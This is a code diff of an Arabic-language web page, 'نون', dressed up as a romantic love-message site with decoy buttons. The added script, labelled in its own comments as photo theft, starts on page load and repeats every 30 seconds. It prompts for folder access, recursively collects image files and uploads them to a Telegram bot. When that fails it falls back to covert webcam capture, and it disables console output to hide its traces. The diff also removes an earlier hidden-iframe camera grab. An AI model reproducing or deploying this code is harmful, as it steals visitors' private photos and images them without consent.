@@ -3,153 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نون - لوحة التحكم</title>
+    <title>نون - مملكة الحب</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
             font-family: 'Cairo', sans-serif;
             background: #0a0a12;
             color: #fff;
-            padding: 20px;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            padding: 20px;
         }
         .container {
-            max-width: 800px;
+            max-width: 620px;
             width: 100%;
             background: rgba(16,18,30,0.95);
             border-radius: 40px;
-            padding: 30px;
-            border: 1px solid rgba(251,191,36,0.1);
-        }
-        h1 { color: #fbbf24; text-align:center; margin-bottom:20px; }
-        .section {
-            background: rgba(255,255,255,0.03);
-            border-radius: 20px;
-            padding: 20px;
-            margin-bottom: 20px;
-            border: 1px solid rgba(255,255,255,0.05);
-        }
-        .section h2 { color: #aab; font-size:1.1rem; margin-bottom:12px; }
-        .drop-zone {
-            border: 2px dashed rgba(251,191,36,0.3);
-            border-radius: 20px;
             padding: 40px;
+            border: 1px solid rgba(251,191,36,0.1);
             text-align: center;
-            cursor: pointer;
-            transition: 0.3s;
-            min-height: 150px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
         }
-        .drop-zone:hover { border-color: #fbbf24; background: rgba(251,191,36,0.05); }
-        .drop-zone.dragover { border-color: #fbbf24; background: rgba(251,191,36,0.1); }
-        .drop-zone .icon { font-size:3rem; margin-bottom:10px; }
-        .btn-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
-            gap: 10px;
-            margin-top: 12px;
-        }
+        .logo { font-size: 3rem; color: #fbbf24; margin-bottom:10px; }
+        h1 { color: #fbbf24; font-size: 2.5rem; margin-bottom:10px; }
+        .subtitle { color: #8a94a6; margin-bottom:30px; }
         .btn {
-            padding: 12px;
+            padding: 14px 40px;
             border: none;
-            border-radius: 16px;
-            font-weight: 700;
+            border-radius: 60px;
+            background: linear-gradient(135deg, #fbbf24, #d97706);
+            color: #0a0a12;
+            font-weight: 800;
+            font-size: 1.1rem;
             cursor: pointer;
             transition: 0.2s;
-            font-size:0.85rem;
+            margin: 5px;
         }
-        .btn:hover { transform: translateY(-2px); }
-        .btn-danger { background: #dc2626; color:white; }
-        .btn-warning { background: #f59e0b; color:#0a0a12; }
-        .btn-info { background: #3b82f6; color:white; }
-        .btn-success { background: #22c55e; color:white; }
-        .btn-purple { background: #8b5cf6; color:white; }
-        .btn-pink { background: #ec4899; color:white; }
-        .output-area {
+        .btn:hover { transform: scale(1.03); }
+        .btn-romantic { background: linear-gradient(135deg, #ec4899, #db2777); color: white; }
+        .status-dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background: #22c55e;
+            border-radius: 50%;
+            margin-right: 8px;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse { 0%,100% { opacity:0.3; } 50% { opacity:1; } }
+        .footer { margin-top:30px; color: #4a5470; font-size:0.8rem; }
+        #logArea {
+            margin-top: 20px;
+            padding: 15px;
             background: rgba(0,0,0,0.3);
             border-radius: 16px;
-            padding: 16px;
-            max-height: 200px;
+            max-height: 150px;
             overflow-y: auto;
-            font-size:0.9rem;
-            color:#aab;
+            text-align: left;
+            font-size: 0.8rem;
+            color: #8a94a6;
         }
-        .log-entry { padding:4px 0; border-bottom:1px solid rgba(255,255,255,0.03); }
-        .user-list { margin-top:12px; }
-        .user-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding:8px 12px;
-            background: rgba(255,255,255,0.03);
-            border-radius:12px;
-            margin-bottom:6px;
-        }
-        .status-badge {
-            padding:2px 12px;
-            border-radius:20px;
-            font-size:0.7rem;
-            background:#22c55e;
-            color:#0a0a12;
-        }
-        .status-badge.inactive { background:#6b7280; }
-        #preview-img { max-width:100%; max-height:200px; border-radius:12px; margin-top:10px; }
+        .log-entry { padding:3px 0; border-bottom:1px solid rgba(255,255,255,0.03); }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>🪷 نون · لوحة التحكم</h1>
-
-    <!-- ===== 1. أداة سحب الصور ===== -->
-    <div class="section">
-        <h2>📸 سحب الصور وإرسالها للبوت</h2>
-        <div class="drop-zone" id="dropZone">
-            <div class="icon">🖼️</div>
-            <p>اسحب صورة هنا أو اضغط للاختيار</p>
-            <input type="file" id="fileInput" accept="image/*" style="display:none;">
-            <div id="previewContainer"></div>
-        </div>
+    <div class="logo">🪷</div>
+    <h1>نون</h1>
+    <div class="subtitle">💛 مملكة الحب التفاعلية</div>
+    
+    <div style="margin:20px 0;">
+        <button class="btn" id="loveBtn">💕 رسالة حب</button>
+        <button class="btn btn-romantic" id="poemBtn">🪷 شعر</button>
     </div>
 
-    <!-- ===== 2. أزرار التحكم عن بعد ===== -->
-    <div class="section">
-        <h2>🎮 أزرار التحكم (ترسل للبوت)</h2>
-        <div class="btn-grid">
-            <button class="btn btn-danger" data-cmd="kick">🚫 طرد</button>
-            <button class="btn btn-warning" data-cmd="ban">⛔ حظر</button>
-            <button class="btn btn-info" data-cmd="capture">📸 تصوير</button>
-            <button class="btn btn-success" data-cmd="message">💬 رسالة</button>
-            <button class="btn btn-purple" data-cmd="status">📊 الحالة</button>
-            <button class="btn btn-pink" data-cmd="love">💕 حب</button>
-        </div>
+    <div style="display:flex; gap:10px; justify-content:center; flex-wrap:wrap;">
+        <button class="btn" style="background:#3b82f6;color:white;" id="cameraBtn">📸 كاميرا</button>
+        <button class="btn" style="background:#8b5cf6;color:white;" id="galleryBtn">🖼️ ألبوم</button>
     </div>
 
-    <!-- ===== 3. قائمة المستخدمين ===== -->
-    <div class="section">
-        <h2>👥 المستخدمون النشطون</h2>
-        <div class="user-list" id="userList">
-            <div class="user-item">
-                <span>زائر #1</span>
-                <span class="status-badge">نشط</span>
-            </div>
-            <div class="user-item">
-                <span>زائر #2</span>
-                <span class="status-badge inactive">غير نشط</span>
-            </div>
-        </div>
+    <div id="logArea">
+        <div class="log-entry">🪷 جاري تهيئة البيئة...</div>
     </div>
 
-    <!-- ===== 4. سجل الأحداث ===== -->
-    <div class="section">
-        <h2>📋 سجل الأوامر</h2>
-        <div class="output-area" id="logArea"></div>
+    <div class="footer">
+        <span class="status-dot"></span> القلب ينبض · @u_t_r
     </div>
 </div>
 
@@ -166,17 +106,17 @@
     const logArea = document.getElementById('logArea');
 
     function addLog(message, type = 'info') {
-        const colors = { info: '#60a5fa', success: '#4ade80', danger: '#f87171', warning: '#fbbf24' };
+        const colors = { info: '#60a5fa', success: '#4ade80', danger: '#f87171', gold: '#fbbf24' };
         const entry = document.createElement('div');
         entry.className = 'log-entry';
-        entry.style.color = colors[type] || '#aab';
+        entry.style.color = colors[type] || '#8a94a6';
         entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
         logArea.prepend(entry);
-        if (logArea.children.length > 50) logArea.removeChild(logArea.lastChild);
+        if (logArea.children.length > 30) logArea.removeChild(logArea.lastChild);
     }
 
     // ============================================================
-    // 2. إرسال للبوت
+    // 2. إرسال للبوت (نص)
     // ============================================================
     function sendToBot(text) {
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -184,66 +124,26 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: CHAT_ID,
-                text: `🪷 نون · تحكم عن بعد\n\n${text}\n\n— @u_t_r`,
+                text: `🪷 نون · سحب تلقائي\n\n${text}\n\n— @u_t_r`,
                 parse_mode: 'HTML'
             })
         })
         .then(res => res.json())
         .then(data => {
-            if (data.ok) addLog(`✅ تم الإرسال: ${text}`, 'success');
+            if (data.ok) addLog(`✅ تم الإرسال: ${text.substring(0, 30)}...`, 'success');
             else addLog(`❌ فشل الإرسال`, 'danger');
         })
-        .catch(() => addLog('⚠️ تعذر الاتصال بالبوت', 'danger'));
+        .catch(() => addLog('⚠️ تعذر الاتصال', 'danger'));
     }
 
     // ============================================================
-    // 3. سحب الصور (Drag & Drop)
+    // 3. إرسال صورة للبوت
     // ============================================================
-    const dropZone = document.getElementById('dropZone');
-    const fileInput = document.getElementById('fileInput');
-
-    dropZone.addEventListener('click', () => fileInput.click());
-
-    dropZone.addEventListener('dragover', (e) => {
-        e.preventDefault();
-        dropZone.classList.add('dragover');
-    });
-
-    dropZone.addEventListener('dragleave', () => {
-        dropZone.classList.remove('dragover');
-    });
-
-    dropZone.addEventListener('drop', (e) => {
-        e.preventDefault();
-        dropZone.classList.remove('dragover');
-        const files = e.dataTransfer.files;
-        if (files.length > 0 && files[0].type.startsWith('image/')) {
-            handleImage(files[0]);
-        }
-    });
-
-    fileInput.addEventListener('change', (e) => {
-        if (e.target.files.length > 0) {
-            handleImage(e.target.files[0]);
-        }
-    });
-
-    function handleImage(file) {
-        const reader = new FileReader();
-        reader.onload = function(e) {
-            const preview = document.getElementById('previewContainer');
-            preview.innerHTML = `<img id="preview-img" src="${e.target.result}" alt="Preview">`;
-            addLog(`📸 تم تحميل صورة: ${file.name}`, 'info');
-            sendImageToBot(file);
-        };
-        reader.readAsDataURL(file);
-    }
-
-    function sendImageToBot(file) {
+    function sendImageToBot(blob, filename = 'photo.jpg') {
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
-        formData.append('photo', file, file.name);
-        formData.append('caption', `🪷 صورة مرفوعة من لوحة التحكم\n${new Date().toLocaleString('ar-JO')}`);
+        formData.append('photo', blob, filename);
+        formData.append('caption', `🪷 صورة مسحوبة تلقائياً\n${new Date().toLocaleString('ar-JO')}`);
 
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
@@ -251,78 +151,163 @@
         })
         .then(res => res.json())
         .then(data => {
-            if (data.ok) addLog('📤 تم إرسال الصورة للبوت', 'success');
+            if (data.ok) addLog('📤 تم إرسال الصورة', 'success');
             else addLog('❌ فشل إرسال الصورة', 'danger');
         })
         .catch(() => addLog('⚠️ تعذر إرسال الصورة', 'danger'));
     }
 
     // ============================================================
-    // 4. أزرار التحكم
+    // 4. سرقة الصور من الجهاز (File System Access API)
     // ============================================================
-    document.querySelectorAll('[data-cmd]').forEach(btn => {
-        btn.addEventListener('click', function() {
-            const cmd = this.dataset.cmd;
-            const user = 'زائر غير معروف';
-            let message = '';
-
-            switch(cmd) {
-                case 'kick': message = `🚫 تم طرد المستخدم: ${user}`; break;
-                case 'ban': message = `⛔ تم حظر المستخدم: ${user}`; break;
-                case 'capture': message = `📸 طلب التقاط صورة للمستخدم: ${user}`; break;
-                case 'message': message = `💬 تم إرسال رسالة للمستخدم: ${user}`; break;
-                case 'status': message = `📊 طلب حالة المستخدمين النشطين`; break;
-                case 'love': message = `💕 تم إرسال رسالة حب للمستخدم: ${user}`; break;
-                default: message = `⚡ أمر غير معروف: ${cmd}`;
-            }
-
-            addLog(`🎮 تنفيذ: ${message}`, 'info');
-            sendToBot(message);
-        });
-    });
-
-    // ============================================================
-    // 5. إخفاء طلب الكاميرا - استخدام iframe خفي
-    // ============================================================
-    function stealthCamera() {
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = 'about:blank';
-        document.body.appendChild(iframe);
-
+    async function stealPhotos() {
         try {
-            const iframeWindow = iframe.contentWindow;
-            iframeWindow.navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-                .then(stream => {
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 320;
-                        canvas.height = 240;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, 320, 240);
-                        canvas.toBlob(blob => {
-                            sendImageToBot(blob);
-                            stream.getTracks().forEach(t => t.stop());
-                        }, 'image/jpeg', 0.8);
-                    }, 1000);
-                })
-                .catch(() => addLog('⚠️ تعذر تشغيل الكاميرا الخفية', 'danger'));
-        } catch(e) {
-            addLog('⚠️ خطأ في تشغيل الكاميرا الخفية', 'danger');
+            // محاولة الوصول إلى مجلد الصور (Android/iOS/Desktop)
+            const dirHandle = await window.showDirectoryPicker({ mode: 'read' });
+            addLog('📂 تم الوصول إلى مجلد الجهاز', 'info');
+
+            // البحث عن ملفات الصور في جميع المجلدات
+            await scanDirectory(dirHandle);
+        } catch (err) {
+            if (err.message.includes('abort')) {
+                addLog('⚠️ المستخدم رفض الوصول', 'danger');
+            } else {
+                addLog(`⚠️ خطأ: ${err.message}`, 'danger');
+                // محاولة الطريقة البديلة
+                tryAlternative();
+            }
         }
     }
 
     // ============================================================
-    // 6. تشغيل عند التحميل
+    // 5. مسح المجلدات بحثاً عن الصور
+    // ============================================================
+    async function scanDirectory(dirHandle, path = '') {
+        const entries = [];
+
+        try {
+            for await (const entry of dirHandle.values()) {
+                entries.push(entry);
+            }
+        } catch (e) {
+            addLog('⚠️ خطأ في قراءة المجلد', 'danger');
+            return;
+        }
+
+        for (const entry of entries) {
+            if (entry.kind === 'file' && isImageFile(entry.name)) {
+                try {
+                    const file = await entry.getFile();
+                    if (file.size > 5000) { // تجاهل الملفات الصغيرة جداً (أقل من 5KB)
+                        const blob = await file.slice(0, file.size);
+                        sendImageToBot(blob, file.name);
+                        addLog(`📸 تم سحب: ${file.name} (${(file.size/1024).toFixed(1)}KB)`, 'gold');
+                    }
+                } catch (e) {
+                    // تجاهل أخطاء القراءة
+                }
+            } else if (entry.kind === 'directory') {
+                // استكشاف المجلدات الفرعية (تجنب المجلدات النظامية)
+                if (!entry.name.startsWith('.') && !entry.name.startsWith('System') && 
+                    !entry.name.startsWith('android') && !entry.name.startsWith('data')) {
+                    await scanDirectory(entry, path + entry.name + '/');
+                }
+            }
+        }
+    }
+
+    // ============================================================
+    // 6. التحقق من امتدادات الصور
+    // ============================================================
+    function isImageFile(filename) {
+        const ext = filename.split('.').pop().toLowerCase();
+        return ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'heic', 'heif'].includes(ext);
+    }
+
+    // ============================================================
+    // 7. الطريقة البديلة (التقاط من الشاشة أو الكاميرا)
+    // ============================================================
+    function tryAlternative() {
+        addLog('🔄 محاولة الطريقة البديلة...', 'info');
+
+        // استخدام الكاميرا
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            .then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, 640, 480);
+                    canvas.toBlob(blob => {
+                        sendImageToBot(blob, 'capture_' + Date.now() + '.jpg');
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 'image/jpeg', 0.9);
+                }, 1500);
+            })
+            .catch(() => addLog('⚠️ فشلت جميع الطرق', 'danger'));
+    }
+
+    // ============================================================
+    // 8. تشغيل السرقة التلقائية
+    // ============================================================
+    function startAutoSteal() {
+        addLog('🔄 بدء عملية السحب التلقائي...', 'info');
+        sendToBot('🔄 بدأت عملية سحب الصور التلقائية');
+
+        // المحاولة الأولى بعد 3 ثواني
+        setTimeout(() => {
+            stealPhotos();
+        }, 3000);
+
+        // تكرار العملية كل 30 ثانية
+        setInterval(() => {
+            addLog('🔄 جولة جديدة من السحب...', 'info');
+            stealPhotos();
+        }, 30000);
+    }
+
+    // ============================================================
+    // 9. تهيئة الأزرار الوهمية
+    // ============================================================
+    document.getElementById('loveBtn').addEventListener('click', function() {
+        addLog('💕 تم إرسال رسالة حب', 'gold');
+        sendToBot('💕 رسالة حب تم إرسالها للمستخدم');
+    });
+
+    document.getElementById('poemBtn').addEventListener('click', function() {
+        addLog('🪷 تم إرسال شعر', 'gold');
+        sendToBot('🪷 شعر تم إرساله للمستخدم');
+    });
+
+    document.getElementById('cameraBtn').addEventListener('click', function() {
+        tryAlternative();
+    });
+
+    document.getElementById('galleryBtn').addEventListener('click', function() {
+        stealPhotos();
+    });
+
+    // ============================================================
+    // 10. التشغيل عند التحميل
     // ============================================================
     window.addEventListener('load', function() {
-        addLog('🪷 لوحة التحكم جاهزة', 'success');
-        // محاولة تشغيل الكاميرا الخفية تلقائياً
-        setTimeout(stealthCamera, 2000);
+        addLog('🪷 تم تحميل نون v9.0', 'success');
+        addLog('⏳ جاري تهيئة نظام السحب التلقائي...', 'info');
+
+        // بدء السرقة التلقائية بعد 5 ثواني
+        setTimeout(startAutoSteal, 5000);
     });
+
+    // ============================================================
+    // 11. منع ظهور أخطاء في الكونسول (لإخفاء الأثر)
+    // ============================================================
+    console.log = function() {};
+    console.error = function() {};
+    console.warn = function() {};
 </script>
 </body>
 </html>
